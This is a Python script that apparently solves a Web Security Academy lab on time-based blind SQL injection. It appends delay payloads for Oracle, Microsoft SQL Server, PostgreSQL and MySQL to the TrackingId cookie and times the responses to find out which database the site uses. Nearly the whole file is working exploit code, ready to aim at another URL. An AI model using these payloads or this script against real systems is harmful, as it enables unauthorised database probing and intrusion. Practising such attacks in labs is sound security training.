
# Blind SQL injection with time delays
# Vulnerability in TrackingId cookie

"""
Oracle: 	 dbms_pipe.receive_message(('a'),10)
Microsoft: 	 WAITFOR DELAY '0:0:10'
PostgreSQL:  SELECT pg_sleep(10)
MySQL:  	 SELECT SLEEP(10) 
"""

import requests
import urllib3
import urllib
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

url = 'https://0a9d00d704da34e7c00142bf004400ea.web-security-academy.net/'

# Getting Cookies
r = requests.get(url, verify=False)
cookies = r.cookies.get_dict()

time_delays = {
    "Oracle" : "dbms_pipe.receive_message(('a'),10)",
    "Microsoft" : "WAITFOR DELAY '0:0:10'",
    "PostgreSQL" : "SELECT pg_sleep(10)",
    "MySQL" : "SELECT SLEEP(10)"
}
print('[+] Fuzzing time delay...')
for db,sql in time_delays.items():
    
    payload = f"' || ({sql})-- -"
    payload = urllib.parse.quote(payload)

    mal_cookies = cookies.copy()
    mal_cookies['TrackingId'] = mal_cookies['TrackingId'] + payload 

    t1 = time.time()
    r = requests.get(url, cookies=mal_cookies, verify=False)
    t2 = time.time()
    diff = t2 - t1
    print(f"-> {db}: {int(diff)}s")